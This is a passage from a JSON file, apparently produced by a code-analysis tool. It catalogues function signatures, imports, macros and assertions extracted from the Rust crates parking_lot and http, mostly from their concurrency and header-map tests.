          "fn two_mutexes_disjoint() {",
          "fn test_debug_condvar() {",
          "fn test_condvar_requeue() {",
          "fn test_issue_129() {",
          "fn new() -> Self {",
          "fn wait<T: ?Sized>(",
          "fn notify(style: NotifyStyle, condition: &Condvar, should_notify: bool) {",
          "fn run_queue_test(",
          "fn consumer_thread(",
          "fn producer_thread(",
          "fn $name() {"
        ],
        "struct_defs": [
          "struct PanicGuard<'a>(&'a Condvar);",
          "struct Queue {"
        ],
        "impl_blocks": [
          "impl WaitTimeoutResult {",
          "impl Condvar {",
          "impl Default for Condvar {",
          "impl fmt::Debug for Condvar {",
          "impl Queue {"
        ],
        "uses": [
          "use crate::mutex::MutexGuard;",
          "use crate::raw_mutex::{RawMutex, TOKEN_HANDOFF, TOKEN_NORMAL};",
          "use crate::{deadlock, util};",
          "use core::{",
          "use lock_api::RawMutex as RawMutex_;",
          "use parking_lot_core::{self, ParkResult, RequeueOp, UnparkResult, DEFAULT_PARK_TOKEN};",
          "use std::ops::DerefMut;",
          "use std::time::{Duration, Instant};",
          "use crate::{Condvar, Mutex, MutexGuard};",
          "use std::sync::mpsc::channel;",
          "use std::sync::Arc;",
          "use std::thread;",
          "use std::thread::sleep;",
          "use std::thread::JoinHandle;",
          "use std::time::Duration;",
          "use std::time::Instant;",
          "use crate::{Condvar, Mutex, MutexGuard};",
          "use std::{collections::VecDeque, sync::Arc, thread, time::Duration};"
        ],
        "macros": [
          "///     println!(\"Nobody was listening for this.\");",
          "panic!(\"attempted to use a condition variable with more than one mutex\");",
          "assert!(c2.notify_one());",
          "assert!(!c.notify_one());",
          "assert_eq!(cond.notify_all(), N);",
          "assert_eq!(cond.notify_all(), 0);",
          "assert!(no_timeout.timed_out());",
          "assert!(!timeout_res.timed_out());",
          "assert!(no_timeout.timed_out());",
          "assert!(!timeout_res.timed_out());",
          "assert!(!timeout_result.timed_out());",
          "assert!(*mutex_guard == 1);",
          "assert!(timeout_result.timed_out());",
          "assert!(*mutex_guard == num_iters + 1);",
          "assert!(!timeout_result.timed_out());",
          "assert!(*mutex_guard == num_iters + 1);",
          "assert!(!timeout_result.timed_out());",
          "assert!(*mutex_guard == num_iters + 2);",
          "assert_eq!(format!(\"{:?}\", c), \"Condvar { .. }\");",
          "assert_eq!(rx.recv_timeout(Duration::from_millis(500)), Ok(()));",
          "assert_eq!(output_vec.len(), num_producers * messages_per_producer);",
          "assert_eq!(msg_idx, output_vec[msg_idx * num_producers + producer_idx]);"
        ],
        "derives": [
          "#[derive(Debug, PartialEq, Eq, Copy, Clone)]",
          "#[derive(Clone, Copy)]",
          "#[derive(Clone, Copy)]"
        ],
        "error_handling": 25
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/parking_lot-0.12.5/src/util.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use std::time::{Duration, Instant};"
        ],
        "macros": [
          "if cfg!(debug_assertions) {",
          "unreachable!();"
        ],
        "derives": [],
        "error_handling": 1
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/parking_lot-0.12.5/src/lib.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [
          "compile_error!(\"the `send_guard` and `deadlock_detection` features cannot be use"
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/parking_lot-0.12.5/src/deadlock.rs",
        "function_defs": [
          "fn check_deadlock() -> bool {",
          "fn test_mutex_deadlock() {",
          "fn test_mutex_deadlock_reentrant() {",
          "fn test_remutex_deadlock() {",
          "fn test_rwlock_deadlock() {",
          "fn test_rwlock_deadlock_reentrant() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use crate::{Mutex, ReentrantMutex, RwLock};",
          "use std::sync::{Arc, Barrier};",
          "use std::thread::{self, sleep};",
          "use std::time::Duration;",
          "use parking_lot_core::deadlock::check_deadlock;"
        ],
        "macros": [
          "//!         println!(\"{} deadlocks detected\", deadlocks.len());",
          "//!             println!(\"Deadlock #{}\", i);",
          "//!                 println!(\"Thread Id {:#?}\", t.thread_id());",
          "//!                 println!(\"{:#?}\", t.backtrace());",
          "assert!(!check_deadlock());",
          "assert!(!check_deadlock());",
          "assert!(check_deadlock());",
          "assert!(!check_deadlock());",
          "assert!(!check_deadlock());",
          "assert!(check_deadlock());",
          "assert!(!check_deadlock());",
          "assert!(!check_deadlock());",
          "assert!(!check_deadlock());",
          "assert!(check_deadlock());",
          "assert!(!check_deadlock());",
          "assert!(!check_deadlock());",
          "assert!(!check_deadlock());",
          "assert!(check_deadlock());",
          "assert!(!check_deadlock());",
          "assert!(!check_deadlock());",
          "assert!(check_deadlock());",
          "assert!(!check_deadlock());"
        ],
        "derives": [],
        "error_handling": 2
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/parking_lot-0.12.5/src/raw_mutex.rs",
        "function_defs": [
          "fn lock(&self) {",
          "fn try_lock(&self) -> bool {",
          "fn is_locked(&self) -> bool {",
          "fn try_lock_until(&self, timeout: Instant) -> bool {",
          "fn try_lock_for(&self, timeout: Duration) -> bool {",
          "fn lock_slow(&self, timeout: Option<Instant>) -> bool {",
          "fn unlock_slow(&self, force_fair: bool) {",
          "fn bump_slow(&self) {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl RawMutex {"
        ],
        "uses": [
          "use crate::{deadlock, util};",
          "use core::{",
          "use lock_api::RawMutex as RawMutex_;",
          "use parking_lot_core::{self, ParkResult, SpinWait, UnparkResult, UnparkToken, DEFAULT_PARK_TOKEN};",
          "use std::time::Instant;"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 4
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/parking_lot-0.12.5/src/remutex.rs",
        "function_defs": [
          "fn nonzero_thread_id(&self) -> NonZeroUsize {",
          "fn smoke() {",
          "fn is_mutex() {",
          "fn trylock_works() {",
          "fn test_reentrant_mutex_debug() {",
          "fn test_reentrant_mutex_bump() {",
          "fn test_serde() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use crate::raw_mutex::RawMutex;",
          "use core::num::NonZeroUsize;",
          "use lock_api::{self, GetThreadId};",
          "use crate::ReentrantMutex;",
          "use crate::ReentrantMutexGuard;",
          "use std::cell::RefCell;",
          "use std::sync::mpsc::channel;",
          "use std::sync::Arc;",
          "use std::thread;",
          "use bincode::{deserialize, serialize};"
        ],
        "macros": [
          "thread_local!(static KEY: u8 = 0);",
          "assert_eq!(*c, 2);",
          "assert_eq!(*b, 2);",
          "assert_eq!(*a, 2);",
          "assert_eq!(*lock.borrow(), 4950);",
          "assert!(lock.is_none());",
          "assert_eq!(format!(\"{:?}\", mutex), \"ReentrantMutex { data: [0, 10] }\");",
          "assert_eq!(*(mutex.lock()), *(deserialized.lock()));",
          "assert_eq!(contents, *(deserialized.lock()));"
        ],
        "derives": [],
        "error_handling": 6
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/parking_lot-0.12.5/src/rwlock.rs",
        "function_defs": [
          "fn smoke() {",
          "fn frob() {",
          "fn test_rw_arc_no_poison_wr() {",
          "fn test_rw_arc_no_poison_ww() {",
          "fn test_rw_arc_no_poison_rr() {",
          "fn test_rw_arc_no_poison_rw() {",
          "fn test_ruw_arc() {",
          "fn test_rw_arc() {",
          "fn test_rw_arc_access_in_unwind() {",
          "fn drop(&mut self) {",
          "fn test_rwlock_unsized() {",
          "fn test_rwlock_try_read() {",
          "fn test_rwlock_try_write() {",
          "fn test_rwlock_try_upgrade() {",
          "fn test_into_inner() {",
          "fn test_into_inner_drop() {",
          "fn drop(&mut self) {",
          "fn test_get_mut() {",
          "fn test_rwlockguard_sync() {",
          "fn sync<T: Sync>(_: T) {}",
          "fn test_rwlock_downgrade() {",
          "fn test_rwlock_recursive() {",
          "fn test_rwlock_debug() {",
          "fn test_clone() {",
          "fn test_serde() {",
          "fn test_issue_203() {",
          "fn drop(&mut self) {",
          "fn test_rw_write_is_locked() {",
          "fn test_issue_430() {"
        ],
        "struct_defs": [
          "struct NonCopy(i32);",
          "struct Unwinder {",
          "struct Foo(Arc<AtomicUsize>);",
          "struct Bar(RwLock<()>);"
        ],
        "impl_blocks": [
          "impl Drop for Unwinder {",
          "impl Drop for Foo {",
          "impl Drop for Bar {"
        ],
        "uses": [
          "use crate::raw_rwlock::RawRwLock;",
          "use crate::{RwLock, RwLockUpgradableReadGuard, RwLockWriteGuard};",
          "use rand::Rng;",
          "use std::sync::atomic::{AtomicUsize, Ordering};",
          "use std::sync::mpsc::channel;",
          "use std::sync::Arc;",
          "use std::thread;",
          "use std::time::Duration;",
          "use bincode::{deserialize, serialize};"
        ],
        "macros": [
          "///     assert_eq!(*r1, 5);",
          "///     assert_eq!(*r2, 5);",
          "///     assert_eq!(*w, 6);",
          "panic!();",
          "assert_eq!(*lock, 1);",
          "panic!();",
          "assert_eq!(*lock, 1);",
          "panic!();",
          "assert_eq!(*lock, 1);",
          "panic!()",
          "assert_eq!(*lock, 1);",
          "assert!(tmp >= 0);",
          "assert_eq!(tmp, *lock);",
          "assert!(*lock >= 0);",
          "assert!(r.join().is_ok());",
          "assert_eq!(*lock, 15);",
          "assert!(*lock >= 0);",
          "assert!(r.join().is_ok());",
          "assert_eq!(*lock, 10);",
          "panic!();",
          "assert_eq!(*lock, 2);",
          "assert_eq!(&*rw.read(), comp);",
          "assert!(",
          "assert!(",
          "assert!(",
          "assert!(",
          "assert!(lock.is_locked());",
          "assert!(!lock.is_locked_exclusive());",
          "assert!(",
          "assert!(lock.is_locked());",
          "assert!(!lock.is_locked_exclusive());",
          "assert!(",
          "assert!(lock.is_locked());",
          "assert!(lock.is_locked_exclusive());",
          "assert!(",
          "assert!(",
          "assert!(",
          "assert_eq!(m.into_inner(), NonCopy(10));",
          "assert_eq!(num_drops.load(Ordering::SeqCst), 0);",
          "assert_eq!(num_drops.load(Ordering::SeqCst), 0);",
          "assert_eq!(num_drops.load(Ordering::SeqCst), 1);",
          "assert_eq!(m.into_inner(), NonCopy(20));",
          "assert_eq!(cur_val, *reader);",
          "assert_eq!(*x.read(), 800);",
          "if cfg!(not(all(target_env = \"sgx\", target_vendor = \"fortanix\"))) {",
          "assert_eq!(format!(\"{:?}\", x), \"RwLock { data: [0, 10] }\");",
          "assert_eq!(format!(\"{:?}\", x), \"RwLock { data: <locked> }\");",
          "assert_eq!(Arc::strong_count(&b), 2);",
          "assert_eq!(*(mutex.read()), *(deserialized.read()));",
          "assert_eq!(contents, *(deserialized.read()));",
          "assert!(lock.is_locked());",
          "assert!(!lock.is_locked_exclusive());",
          "assert!(lock.is_locked());",
          "assert!(lock.is_locked_exclusive());",
          "println!(\"lock upgrade\");",
          "println!(\"lock upgrade\");"
        ],
        "derives": [
          "#[derive(Eq, PartialEq, Debug)]"
        ],
        "error_handling": 11
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/parking_lot-0.12.5/src/mutex.rs",
        "function_defs": [
          "fn smoke() {",
          "fn lots_and_lots() {",
          "fn inc(m: &Mutex<u32>) {",
          "fn try_lock() {",
          "fn test_into_inner() {",
          "fn test_into_inner_drop() {",
          "fn drop(&mut self) {",
          "fn test_get_mut() {",
          "fn test_mutex_arc_condvar() {",
          "fn test_mutex_arc_nested() {",
          "fn test_mutex_arc_access_in_unwind() {",
          "fn drop(&mut self) {",
          "fn test_mutex_unsized() {",
          "fn test_mutexguard_sync() {",
          "fn sync<T: Sync>(_: T) {}",
          "fn test_mutex_debug() {",
          "fn test_serde() {",
          "fn test_map_or_err_not_mapped() {",
          "fn test_map_or_err_mapped() {"
        ],
        "struct_defs": [
          "struct Packet<T>(Arc<(Mutex<T>, Condvar)>);",
          "struct NonCopy(i32);",
          "struct Foo(Arc<AtomicUsize>);",
          "struct Unwinder {"
        ],
        "impl_blocks": [
          "impl Drop for Foo {",
          "impl Drop for Unwinder {"
        ],
        "uses": [
          "use crate::raw_mutex::RawMutex;",
          "use crate::{Condvar, MappedMutexGuard, Mutex, MutexGuard};",
          "use std::collections::HashMap;",
          "use std::ops::Deref;",
          "use std::sync::atomic::{AtomicUsize, Ordering};",
          "use std::sync::mpsc::channel;",
          "use std::sync::Arc;",
          "use std::thread;",
          "use bincode::{deserialize, serialize};"
        ],
        "macros": [
          "assert_eq!(*m.lock(), J * K * 2);",
          "assert_eq!(m.into_inner(), NonCopy(10));",
          "assert_eq!(num_drops.load(Ordering::SeqCst), 0);",
          "assert_eq!(num_drops.load(Ordering::SeqCst), 0);",
          "assert_eq!(num_drops.load(Ordering::SeqCst), 1);",
          "assert_eq!(m.into_inner(), NonCopy(20));",
          "assert!(!*lock);",
          "assert_eq!(*lock2, 1);",
          "panic!();",
          "assert_eq!(*lock, 2);",
          "assert_eq!(&*mutex.lock(), comp);",
          "assert_eq!(format!(\"{:?}\", mutex), \"Mutex { data: [0, 10] }\");",
          "assert_eq!(format!(\"{:?}\", mutex), \"Mutex { data: <locked> }\");",
          "assert_eq!(*(mutex.lock()), *(deserialized.lock()));",
          "assert_eq!(contents, *(deserialized.lock()));",
          "Ok(_) => unreachable!(),",
          "assert_eq!(data, 12345i32);",
          "assert_eq!(guard.get(\"hello\"), Some(&\"world\".to_string()));",
          "Err((_, _)) => unreachable!(),",
          "assert_eq!(mapped_guard.as_str(), \"world\");",
          "Ok(_) => unreachable!(),",
          "assert_eq!(guard.as_str(), \"world\");",
          "assert_eq!(err, 45678i32);",
          "Err((_, _)) => unreachable!(),",
          "assert_eq!(mapped_guard.as_str(), \"world\");",
          "Ok(mapped_guard) => assert_eq!(mapped_guard.deref(), \"world\"),",
          "Err((_, _)) => unreachable!(),"
        ],
        "derives": [
          "#[derive(Eq, PartialEq, Debug)]"
        ],
        "error_handling": 19
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/parking_lot-0.12.5/src/raw_rwlock.rs",
        "function_defs": [
          "fn lock_exclusive(&self) {",
          "fn try_lock_exclusive(&self) -> bool {",
          "fn lock_shared(&self) {",
          "fn try_lock_shared(&self) -> bool {",
          "fn is_locked(&self) -> bool {",
          "fn is_locked_exclusive(&self) -> bool {",
          "fn try_lock_shared_for(&self, timeout: Self::Duration) -> bool {",
          "fn try_lock_shared_until(&self, timeout: Self::Instant) -> bool {",
          "fn try_lock_exclusive_for(&self, timeout: Duration) -> bool {",
          "fn try_lock_exclusive_until(&self, timeout: Instant) -> bool {",
          "fn lock_shared_recursive(&self) {",
          "fn try_lock_shared_recursive(&self) -> bool {",
          "fn try_lock_shared_recursive_for(&self, timeout: Self::Duration) -> bool {",
          "fn try_lock_shared_recursive_until(&self, timeout: Self::Instant) -> bool {",
          "fn lock_upgradable(&self) {",
          "fn try_lock_upgradable(&self) -> bool {",
          "fn try_lock_upgradable_until(&self, timeout: Instant) -> bool {",
          "fn try_lock_upgradable_for(&self, timeout: Duration) -> bool {",
          "fn try_lock_shared_fast(&self, recursive: bool) -> bool {",
          "fn try_lock_shared_slow(&self, recursive: bool) -> bool {",
          "fn try_lock_upgradable_fast(&self) -> bool {",
          "fn try_lock_upgradable_slow(&self) -> bool {",
          "fn lock_exclusive_slow(&self, timeout: Option<Instant>) -> bool {",
          "fn unlock_exclusive_slow(&self, force_fair: bool) {",
          "fn lock_shared_slow(&self, recursive: bool, timeout: Option<Instant>) -> bool {",
          "fn unlock_shared_slow(&self) {",
          "fn lock_upgradable_slow(&self, timeout: Option<Instant>) -> bool {",
          "fn unlock_upgradable_slow(&self, force_fair: bool) {",
          "fn try_upgrade_slow(&self) -> bool {",
          "fn upgrade_slow(&self, timeout: Option<Instant>) -> bool {",
          "fn downgrade_slow(&self) {",
          "fn downgrade_to_upgradable_slow(&self) {",
          "fn bump_exclusive_slow(&self) {",
          "fn bump_upgradable_slow(&self) {",
          "fn wait_for_readers(&self, timeout: Option<Instant>, prev_value: usize) -> bool {",
          "fn lock_common(",
          "fn deadlock_acquire(&self) {",
          "fn deadlock_release(&self) {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl RawRwLock {"
        ],
        "uses": [
          "use crate::elision::{have_elision, AtomicElisionExt};",
          "use crate::raw_mutex::{TOKEN_HANDOFF, TOKEN_NORMAL};",
          "use crate::util;",
          "use core::{",
          "use lock_api::{RawRwLock as RawRwLock_, RawRwLockUpgrade};",
          "use parking_lot_core::{",
          "use std::time::{Duration, Instant};"
        ],
        "macros": [
          "debug_assert!(result);",
          "debug_assert!(result);",
          "debug_assert!(result);",
          "debug_assert!(result);",
          "debug_assert!(result);",
          "debug_assert!(was_last_thread);"
        ],
        "derives": [],
        "error_handling": 11
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/parking_lot-0.12.5/src/elision.rs",
        "function_defs": [
          "fn elision_compare_exchange_acquire(",
          "fn elision_fetch_sub_release(&self, val: Self::IntType) -> Self::IntType;",
          "fn elision_compare_exchange_acquire(&self, _: usize, _: usize) -> Result<usize, usize> {",
          "fn elision_fetch_sub_release(&self, _: usize) -> usize {",
          "fn elision_compare_exchange_acquire(&self, current: usize, new: usize) -> Result<usize, usize> {",
          "fn elision_fetch_sub_release(&self, val: usize) -> usize {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl AtomicElisionExt for AtomicUsize {",
          "impl AtomicElisionExt for AtomicUsize {"
        ],
        "uses": [
          "use std::sync::atomic::AtomicUsize;",
          "use core::arch::asm;",
          "use core::arch::asm;"
        ],
        "macros": [
          "cfg!(all(",
          "unreachable!();",
          "unreachable!();",
          "asm!(",
          "asm!(",
          "asm!(",
          "asm!("
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/parking_lot-0.12.5/src/fair_mutex.rs",
        "function_defs": [
          "fn smoke() {",
          "fn lots_and_lots() {",
          "fn inc(m: &FairMutex<u32>) {",
          "fn try_lock() {",
          "fn test_into_inner() {",
          "fn test_into_inner_drop() {",
          "fn drop(&mut self) {",
          "fn test_get_mut() {",
          "fn test_mutex_arc_nested() {",
          "fn test_mutex_arc_access_in_unwind() {",
          "fn drop(&mut self) {",
          "fn test_mutex_unsized() {",
          "fn test_mutexguard_sync() {",
          "fn sync<T: Sync>(_: T) {}",
          "fn test_mutex_debug() {",
          "fn test_serde() {"
        ],
        "struct_defs": [
          "struct NonCopy(i32);",
          "struct Foo(Arc<AtomicUsize>);",
          "struct Unwinder {"
        ],
        "impl_blocks": [
          "impl Drop for Foo {",
          "impl Drop for Unwinder {"
        ],
        "uses": [
          "use crate::raw_fair_mutex::RawFairMutex;",
          "use crate::FairMutex;",
          "use std::sync::atomic::{AtomicUsize, Ordering};",
          "use std::sync::mpsc::channel;",
          "use std::sync::Arc;",
          "use std::thread;",
          "use bincode::{deserialize, serialize};"
        ],
        "macros": [
          "assert_eq!(*m.lock(), J * K * 2);",
          "assert_eq!(m.into_inner(), NonCopy(10));",
          "assert_eq!(num_drops.load(Ordering::SeqCst), 0);",
          "assert_eq!(num_drops.load(Ordering::SeqCst), 0);",
          "assert_eq!(num_drops.load(Ordering::SeqCst), 1);",
          "assert_eq!(m.into_inner(), NonCopy(20));",
          "assert_eq!(*lock2, 1);",
          "panic!();",
          "assert_eq!(*lock, 2);",
          "assert_eq!(&*mutex.lock(), comp);",
          "assert_eq!(format!(\"{:?}\", mutex), \"Mutex { data: [0, 10] }\");",
          "assert_eq!(format!(\"{:?}\", mutex), \"Mutex { data: <locked> }\");",
          "assert_eq!(*(mutex.lock()), *(deserialized.lock()));",
          "assert_eq!(contents, *(deserialized.lock()));"
        ],
        "derives": [
          "#[derive(Eq, PartialEq, Debug)]"
        ],
        "error_handling": 12
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/parking_lot-0.12.5/src/once.rs",
        "function_defs": [
          "fn call_once_slow(&self, ignore_poison: bool, f: &mut dyn FnMut(OnceState)) {",
          "fn drop(&mut self) {",
          "fn default() -> Once {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn smoke_once() {",
          "fn stampede_once() {",
          "fn poison_bad() {",
          "fn wait_for_force_to_finish() {",
          "fn test_once_debug() {"
        ],
        "struct_defs": [
          "struct PanicGuard<'a>(&'a Once);"
        ],
        "impl_blocks": [
          "impl OnceState {",
          "impl Once {",
          "impl Default for Once {",
          "impl fmt::Debug for Once {"
        ],
        "uses": [
          "use crate::util::UncheckedOptionExt;",
          "use core::{",
          "use parking_lot_core::{self, SpinWait, DEFAULT_PARK_TOKEN, DEFAULT_UNPARK_TOKEN};",
          "use crate::Once;",
          "use std::panic;",
          "use std::sync::mpsc::channel;",
          "use std::thread;"
        ],
        "macros": [
          "matches!(self, OnceState::Poisoned)",
          "matches!(self, OnceState::Done)",
          "panic!(\"Once instance has previously been poisoned\");",
          "let timed_out = |_, _| unreachable!();",
          "assert_eq!(a, 1);",
          "assert_eq!(a, 1);",
          "assert!(!RUN);",
          "assert!(RUN);",
          "assert!(!RUN);",
          "assert!(RUN);",
          "O.call_once(|| panic!());",
          "assert!(t.is_err());",
          "assert!(t.is_err());",
          "assert!(p.poisoned())",
          "assert!(called);",
          "O.call_once(|| panic!());",
          "assert!(t.is_err());",
          "assert!(p.poisoned());",
          "assert!(!called);",
          "assert!(t1.join().is_ok());",
          "assert!(t2.join().is_ok());",
          "assert_eq!(format!(\"{:?}\", O), \"Once { state: New }\");"
        ],
        "derives": [
          "#[derive(Copy, Clone, Eq, PartialEq, Debug)]"
        ],
        "error_handling": 8
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/parking_lot-0.12.5/src/raw_fair_mutex.rs",
        "function_defs": [
          "fn lock(&self) {",
          "fn try_lock(&self) -> bool {",
          "fn is_locked(&self) -> bool {",
          "fn try_lock_until(&self, timeout: Self::Instant) -> bool {",
          "fn try_lock_for(&self, timeout: Self::Duration) -> bool {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use crate::raw_mutex::RawMutex;",
          "use lock_api::RawMutexFair;"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 0
      }
    ],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/http-0.2.12",
    "name": "http-0.2.12",
    "languages": [
      "Rust"
    ],
    "python_patterns": [],
    "rust_patterns": [
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/http-0.2.12/tests/header_map.rs",
        "function_defs": [
          "fn smoke() {",
          "fn reserve_over_capacity() {",
          "fn with_capacity_max() {",
          "fn with_capacity_overflow() {",
          "fn reserve_overflow() {",
          "fn drain() {",
          "fn drain_drop_immediately() {",
          "fn drain_forget() {",
          "fn drain_entry() {",
          "fn eq() {",
          "fn into_header_name() {",
          "fn as_header_name() {",
          "fn insert_all_std_headers() {",
          "fn insert_79_custom_std_headers() {",
          "fn append_multiple_values() {",
          "fn custom_std(n: usize) -> Vec<HeaderName> {",
          "fn get_invalid() {",
          "fn insert_invalid() {",
          "fn value_htab() {",
          "fn remove_multiple_a() {",
          "fn remove_multiple_b() {",
          "fn remove_entry_multi_0() {",
          "fn remove_entry_multi_0_others() {",
          "fn remove_entry_multi_1() {",
          "fn remove_entry_multi_1_other() {",
          "fn remove_entry_multi_2() {",
          "fn remove_entry_multi_3() {",
          "fn remove_entry_multi_3_others() {",
          "fn remove_all_values<K>(headers: &mut HeaderMap, key: K) -> Vec<HeaderValue>",
          "fn remove_entry_3_others_a() {",
          "fn remove_entry_3_others_b() {",
          "fn remove_values<K>(headers: &mut HeaderMap, key: K) -> Option<HeaderValue>"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use http::header::*;",
          "use http::*;"
        ],
        "macros": [
          "assert!(headers.get(\"hello\").is_none());",
          "_ => panic!(),",
          "assert!(headers.get(\"hello\").is_some());",
          "assert_eq!(e.get(), &\"world\");",
          "assert_eq!(*i.next().unwrap(), \"world\");",
          "assert_eq!(*i.next().unwrap(), \"zomg\");",
          "assert!(i.next().is_none());",
          "_ => panic!(),",
          "assert_eq!(name.unwrap().as_str(), \"hello\");",
          "assert_eq!(value, \"world\");",
          "assert!(iter.next().is_none());",
          "assert!(headers.is_empty());",
          "assert_eq!(name.unwrap().as_str(), \"hello\");",
          "assert_eq!(value, \"world\");",
          "assert_eq!(name, None);",
          "assert_eq!(value, \"world2\");",
          "assert_eq!(name.unwrap().as_str(), \"zomg\");",
          "assert_eq!(value, \"bar\");",
          "assert!(iter.next().is_none());",
          "assert_eq!(iter.size_hint(), (2, Some(3)));",
          "assert_eq!(headers.len(), 2);",
          "assert_eq!(iter.size_hint(), (2, Some(2)));",
          "assert_eq!(headers.len(), 0);",
          "assert_eq!(5, headers.len());",
          "_ => panic!(),",
          "assert_eq!(2, vals.len());",
          "assert_eq!(vals[0], \"world\");",
          "assert_eq!(vals[1], \"world2\");",
          "assert_eq!(5-2+1, headers.len());",
          "assert_eq!(a, b);",
          "assert_ne!(a, b);",
          "assert_eq!(a, b);",
          "assert_ne!(a, b);",
          "assert_ne!(a, b);",
          "assert_eq!(a, b);",
          "assert_ne!(a, b);",
          "assert_eq!(m.len(), 6);",
          "assert_eq!(m.get(\"host\"), expected);",
          "assert_eq!(m.get(&HOST), expected);",
          "assert_eq!(m.get(&s), expected);",
          "assert_eq!(m.get(s.as_str()), expected);",
          "assert_eq!(m[&STD[j]], STD[j].as_str());",
          "assert!(",
          "assert_eq!(h[&hdrs[j]], hdrs[j].as_str());",
          "assert!(h.get(&hdrs[j]).is_none());",
          "assert_eq!(&vals, &[&\"json\", &\"html\", &\"xml\"]);",
          "let s = format!(\"{}-{}\", STD[i % STD.len()].as_str(), i);",
          "assert!(headers.get(\"Evil\\r\\nKey\").is_none());",
          "assert_eq!(headers.len(), 6);",
          "assert_eq!(cookie, Some(\"cookie_1=value 1\".parse().unwrap()));",
          "assert_eq!(headers.len(), 3);",
          "assert_eq!(via, Some(\"1.1 example.com\".parse().unwrap()));",
          "assert_eq!(headers.len(), 1);",
          "assert_eq!(vary, Some(\"*\".parse().unwrap()));",
          "assert_eq!(headers.len(), 0);",
          "assert_eq!(headers.len(), 6);",
          "assert_eq!(vary, Some(\"*\".parse().unwrap()));",
          "assert_eq!(headers.len(), 5);",
          "assert_eq!(via, Some(\"1.1 example.com\".parse().unwrap()));",
          "assert_eq!(headers.len(), 3);",
          "assert_eq!(cookie, Some(\"cookie_1=value 1\".parse().unwrap()));",
          "assert_eq!(headers.len(), 0);",
          "assert_eq!(cookies.len(), 0);",
          "assert_eq!(headers.len(), 0);",
          "assert_eq!(cookies.len(), 0);",
          "assert_eq!(headers.len(), 2);",
          "assert_eq!(cookies.len(), 1);",
          "assert_eq!(headers.len(), 0);",
          "assert_eq!(cookies.len(), 1);",
          "assert_eq!(headers.len(), 1);",
          "assert_eq!(vias.len(), 1);",
          "assert_eq!(headers.len(), 0);",
          "assert_eq!(cookies.len(), 2);",
          "assert_eq!(headers.len(), 0);",
          "assert_eq!(cookies.len(), 3);",
          "assert_eq!(headers.len(), 0);",
          "assert_eq!(cookies.len(), 3);",
          "assert_eq!(headers.len(), 3);",
          "assert_eq!(vias.len(), 2);",
          "assert_eq!(headers.len(), 1);",
          "assert_eq!(varies.len(), 1);",
          "assert_eq!(headers.len(), 0);",
          "assert_eq!(headers.len(), 6);",
          "assert_eq!(cookie, Some(\"cookie_1=value 1\".parse().unwrap()));",
          "assert_eq!(headers.len(), 3);",
          "assert_eq!(via, Some(\"1.1 example.com\".parse().unwrap()));",
          "assert_eq!(headers.len(), 1);",
          "assert_eq!(vary, Some(\"*\".parse().unwrap()));",
          "assert_eq!(headers.len(), 0);",
          "assert_eq!(headers.len(), 6);",
          "assert_eq!(vary, Some(\"*\".parse().unwrap()));",
          "assert_eq!(headers.len(), 5);",
          "assert_eq!(via, Some(\"1.1 example.com\".parse().unwrap()));",
          "assert_eq!(headers.len(), 3);",
          "assert_eq!(cookie, Some(\"cookie_1=value 1\".parse().unwrap()));",
          "assert_eq!(headers.len(), 0);"
        ],
        "derives": [],
        "error_handling": 122
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/http-0.2.12/tests/status_code.rs",
        "function_defs": [
          "fn from_bytes() {",
          "fn equates_with_u16() {",
          "fn roundtrip() {",
          "fn is_informational() {",
          "fn is_success() {",
          "fn is_redirection() {",
          "fn is_client_error() {",
          "fn is_server_error() {",
          "fn status_code(status_code: u16) -> StatusCode {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use http::*;"
        ],
        "macros": [
          "assert!(StatusCode::from_bytes(ok.as_bytes()).is_ok());",
          "assert!(StatusCode::from_bytes(not_ok.as_bytes()).is_err());",
          "assert_eq!(200u16, status);",
          "assert_eq!(status, 200u16);",
          "assert_eq!(s, u16::from(status));",
          "assert_eq!(sstr, status.as_str());",
          "assert!(status_code(100).is_informational());",
          "assert!(status_code(199).is_informational());",
          "assert!(!status_code(200).is_informational());",
          "assert!(status_code(200).is_success());",
